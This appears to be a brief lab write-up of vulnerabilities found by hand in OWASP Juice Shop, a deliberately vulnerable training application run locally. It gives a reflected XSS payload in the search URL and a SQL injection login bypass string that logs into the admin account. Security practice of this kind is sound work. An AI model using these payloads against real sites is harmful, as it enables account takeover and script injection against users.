# Owasp_juice_shop

Vulns found manually exploiring the application (with no tools) 

XSS: 
```
http://127.0.0.1:3000/#/search?q=hello%22%3E%3Cimg%2Fsrc%3Dx%20onerror%3Dalert(document.domain)%3E
```

SQLI Auth bypass
```
' or 1=1-- -
```
On username field. Logs into admin account.
`url: http://127.0.0.1:3000/#/login`



